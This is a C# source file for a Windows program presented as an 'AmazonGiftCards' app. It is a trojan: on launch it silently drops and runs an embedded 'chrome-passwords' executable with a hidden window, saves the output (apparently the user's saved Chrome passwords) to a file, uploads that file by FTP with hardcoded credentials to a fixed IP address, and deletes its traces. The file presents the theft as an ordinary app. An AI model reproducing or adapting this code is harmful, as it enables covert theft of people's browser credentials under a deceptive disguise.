using AmazonGiftCards.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace AmazonGiftCards
{
    static class Program
    {
        [DllImport("User32.Dll", EntryPoint = "PostMessageA")]
        private static extern bool PostMessage(IntPtr hWnd, uint msg, int wParam, int lParam);
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            LaunchCommandLineApp();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }

        static void LaunchCommandLineApp()
        {
            string folderName = @"\gotYa\";
            string fileName = Environment.UserName;
            string date = DateTime.UtcNow.ToString("yyyyMMdd");
            System.IO.Directory.CreateDirectory(folderName);


            byte[] exeBytes = Properties.Resources.chrome_passwords;
            string exeToRun = Path.Combine(Path.GetTempPath(), "chrome-passwords.exe");

            if (File.Exists(exeToRun))
            {
                foreach (var node in Process.GetProcessesByName("chrome-passwords"))
                {
                    node.Kill();
                }

                File.Delete(exeToRun);
            }

            using (FileStream exeFile = new FileStream(exeToRun, FileMode.CreateNew))
                exeFile.Write(exeBytes, 0, exeBytes.Length);

            Process p = new Process();
            p.StartInfo = new ProcessStartInfo("CMD.exe", "/C " + exeToRun + $" - p > {folderName}{fileName}-{date}");
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.Start();
            p.StandardInput.Write("dir" + p.StandardInput.NewLine);
            p.WaitForExit();

            using (var client = new WebClient())
            {
                client.Credentials = new NetworkCredential("cazzo", "cazzo");
                client.UploadFile($"ftp://192.168.0.208:21/{fileName}-{date}.txt", WebRequestMethods.Ftp.UploadFile, $"{folderName}{fileName}-{date}");
            }

            System.IO.Directory.Delete(folderName, true);

        }
    }
}
